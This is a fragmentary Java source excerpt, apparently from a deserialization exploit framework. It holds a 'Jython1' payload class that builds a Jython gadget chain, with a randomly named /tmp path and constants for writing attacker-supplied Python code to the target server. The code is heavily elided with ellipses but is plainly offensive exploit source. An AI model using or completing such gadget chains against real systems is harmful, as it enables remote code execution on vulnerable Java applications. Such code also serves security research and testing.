...
@Sink({Sink.Python})
public class Jython1 implements ObjectPayload<Object> {
    ...
    public Object getObject(SinksHelper sinksHelper) throws Exception {
        ...
        if (serverFilePath == null)
            serverFilePath = "/tmp/" + RanDomUtils.generateRandomString(5);
        Printer.yellowInfo("Server file path: " + serverFilePath);

        Object kickOffObject = getChain(sinkObject, serverFilePath);

        return kickOffObject;
    }

    public Object getChain(Object sinkObject, String remotePath) throws Exception {
        ...
        PyObject[] consts = new PyObject[]{new PyString(""), new PyString(remotePath), new PyString("w+"), new PyString(pythonCode)};
